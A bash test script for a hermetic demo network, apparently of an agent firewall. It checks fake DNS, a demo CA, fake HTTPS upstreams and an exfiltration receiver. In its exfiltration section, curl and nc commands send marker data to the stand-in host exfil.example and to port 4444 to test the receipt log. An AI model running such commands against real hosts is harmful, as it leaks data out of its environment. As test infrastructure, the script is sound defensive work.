#!/usr/bin/env bash
# Tests of the hermetic "outside world" of the demo (no Internet service is ever used):
# demo PKI, CoreDNS answers, fake HTTPS upstreams signed by the demo CA, exfiltration receipt log.
# Runs the demo compose file under a separate project name with only the world services.
# shellcheck source=deploy/tests/common.sh
. "$(dirname "$0")/common.sh"
cd "$ROOT"

PROJECT="${WORLD_PROJECT:-afw-world-test}"
dc() { docker compose -p "$PROJECT" -f demo/docker-compose.yml "$@"; }
WORLD_SERVICES="demo-pki demo-dns fake-llm exfil allowed-api s3"

if docker network ls --format '{{.Name}}' | grep -q '^afw-demo_wan$'; then
  echo "the demo is running (network afw-demo_wan exists, same subnets): run demo/down.sh first"; exit 2
fi
cleanup() { dc down -v --remove-orphans >/dev/null 2>&1 || true; }
trap cleanup EXIT

section "build and start the demo world"
check "build afw-demo-tools image" dc build demo-pki
# shellcheck disable=SC2086 # list of services
check "start $WORLD_SERVICES" dc up -d --wait $WORLD_SERVICES

# Run a probe on the wan network only, with the demo PKI mounted.
probe() {
  docker run --rm --network "${PROJECT}_wan" -v "${PROJECT}_demo-pki:/pki:ro" \
    afw-demo-tools:local sh -c "$1"
}

section "DNS (CoreDNS, hermetic)"
for pair in api.anthropic.com=198.18.0.10 exfil.example=198.18.0.11 allowed.example=198.18.0.12 \
            api.github.com=198.18.0.12 s3.demo.example=198.18.0.13; do
  name="${pair%%=*}"; ip="${pair#*=}"
  check "$name resolves to $ip" bash -c '[ "$(docker run --rm --network "$3_wan" afw-demo-tools:local dig +short @198.18.0.53 "$1" A | head -n1)" = "$2" ]' _ "$name" "$ip" "$PROJECT"
done
check "unknown names are NXDOMAIN (no Internet forwarding)" \
  bash -c '[ "$(docker run --rm --network "$1_wan" afw-demo-tools:local dig +noall +comments @198.18.0.53 example.com A | grep -c NXDOMAIN)" -ge 1 ]' _ "$PROJECT"

section "fake HTTPS upstreams (demo CA)"
check "demo CA and upstream certificate exist" probe 'test -s /pki/demo-ca.crt && test -s /pki/upstream.crt && test -s /pki/upstream.key'
check "upstream certificate verifies against the demo CA" probe 'openssl verify -CAfile /pki/demo-ca.crt /pki/upstream.crt'
check "demo CA private key is not readable by others" probe '[ "$(stat -c %a /pki/demo-ca.key)" = 600 ]'
check "fake LLM answers /v1/messages over HTTPS" \
  probe 'curl -sf --cacert /pki/demo-ca.crt --resolve api.anthropic.com:443:198.18.0.10 -H "content-type: application/json" -d "{\"model\":\"demo\",\"messages\":[]}" https://api.anthropic.com/v1/messages | grep -q "\"type\": *\"message\""'
check "TLS fails without the demo CA" \
  probe '! curl -s -o /dev/null --resolve allowed.example:443:198.18.0.12 https://allowed.example/'
check "allowed-api answers for api.github.com too (SAN)" \
  probe 'curl -sf --cacert /pki/demo-ca.crt --resolve api.github.com:443:198.18.0.12 https://api.github.com/zen'
check "s3 accepts a presigned PUT" \
  probe 'curl -sf --cacert /pki/demo-ca.crt --resolve s3.demo.example:443:198.18.0.13 -X PUT --data-binary hello "https://s3.demo.example/bucket/k?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Signature=abcdef"'

section "exfiltration receipt log (evidence for scenarios)"
marker="world-test-$$-$RANDOM"
probe "curl -sf --cacert /pki/demo-ca.crt --resolve exfil.example:443:198.18.0.11 -d $marker https://exfil.example/upload" >/dev/null 2>&1 || true
probe "echo raw-$marker | nc -w 2 198.18.0.11 4444" >/dev/null 2>&1 || true
sleep 1
check "exfil logged the HTTPS body" bash -c 'docker compose -p "$1" -f demo/docker-compose.yml exec -T exfil cat /data/exfil.jsonl | grep -q "$2"' _ "$PROJECT" "$marker"
check "exfil logged the raw TCP payload" bash -c 'docker compose -p "$1" -f demo/docker-compose.yml exec -T exfil cat /data/exfil.jsonl | grep -q "raw-$2"' _ "$PROJECT" "$marker"

finish
